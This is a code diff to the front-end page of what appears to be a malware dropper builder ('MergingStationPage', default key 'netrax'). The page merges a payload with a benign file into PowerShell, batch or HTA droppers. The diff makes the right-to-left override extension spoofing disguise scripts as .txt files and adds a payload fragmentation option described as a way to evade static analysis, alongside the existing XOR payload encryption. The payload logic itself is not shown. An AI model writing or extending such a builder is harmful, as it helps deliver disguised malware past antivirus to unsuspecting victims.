@@ -28,14 +28,15 @@ const formSchema = z.object({
   extensionSpoofing: z.boolean().default(false),
   useXorEncryption: z.boolean().default(false),
   xorKey: z.string().optional(),
+  useFragmentation: z.boolean().default(false),
 });
 
 const outputFormats = {
     'ps1': { name: 'PowerShell (.ps1)', extension: 'ps1', disabled: false },
     'bat': { name: 'Batch (.bat)', extension: 'bat', disabled: false },
     'hta': { name: 'HTML Application (.hta)', extension: 'hta', disabled: false },
-    'js': { name: 'JScript (.js)', extension: 'js', disabled: false },
-    'vbs': { name: 'VBScript (.vbs)', extension: 'vbs', disabled: false },
+    'js': { name: 'JScript (.js)', extension: 'js', disabled: true },
+    'vbs': { name: 'VBScript (.vbs)', extension: 'vbs', disabled: true },
     'exe': { name: 'Windows Executable (.exe)', extension: 'exe', disabled: true },
     'scr': { name: 'Screensaver (.scr)', extension: 'scr', disabled: true },
     'lnk': { name: 'Shortcut (.lnk)', extension: 'lnk', disabled: true },
@@ -56,6 +57,7 @@ export default function MergingStationPage() {
       extensionSpoofing: false,
       useXorEncryption: false,
       xorKey: 'netrax',
+      useFragmentation: false,
     },
   });
 
@@ -65,7 +67,7 @@ export default function MergingStationPage() {
     const nameWithoutExt = parts.join('.');
     
     // RLO character
-    return `${nameWithoutExt}\u202E${realExtension.split('').reverse().join('')}`;
+    return `${nameWithoutExt}\u202E${realExtension.split('').reverse().join('')}.txt`;
  };
  
  const handleFormatChange = (value: string) => {
@@ -87,7 +89,7 @@ export default function MergingStationPage() {
 
     const log = (message: string) => {
         setBuildLog(prev => [...prev, message]);
-        setProgress(prev => Math.min(prev + 25, 100));
+        setProgress(prev => Math.min(prev + 15, 100));
     };
 
     try {
@@ -106,6 +108,7 @@ export default function MergingStationPage() {
             benign: { name: benignFile.name, content: benignContent },
             outputFormat: values.outputFormat as any,
             encryption: values.useXorEncryption ? { type: 'xor', key: values.xorKey || 'defaultkey' } : undefined,
+            useFragmentation: values.useFragmentation,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -115,6 +118,9 @@ export default function MergingStationPage() {
         log(`Dropper script generated successfully (${values.outputFormat}).`);
         if (values.useXorEncryption) {
             log(`Payload encrypted with XOR key: '${values.xorKey}'`);
+        }
+        if (values.useFragmentation) {
+            log(`Payload split into fragments.`);
         }
 
         const finalName = values.extensionSpoofing
@@ -194,7 +200,7 @@ export default function MergingStationPage() {
                             <div className="space-y-1 leading-none">
                               <FormLabel>Enable Extension Spoofing</FormLabel>
                               <FormDescription>
-                                Use RLO character to mask the true extension. E.g., `report.pdf.ps1`.
+                                Use RLO character to mask the true extension. E.g., `report.ps1` appears as `report.txt`.
                               </FormDescription>
                             </div>
                           </FormItem>
@@ -236,6 +242,19 @@ export default function MergingStationPage() {
                                 )}
                             />
                          )}
+                         <FormField
+                            control={form.control}
+                            name="useFragmentation"
+                            render={({ field }) => (
+                            <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
+                                <FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl>
+                                <div className="space-y-1 leading-none">
+                                <FormLabel>Enable Payload Fragmentation</FormLabel>
+                                <FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription>
+                                </div>
+                            </FormItem>
+                            )}
+                        />
                     </CardContent>
                  </Card>
                </div>
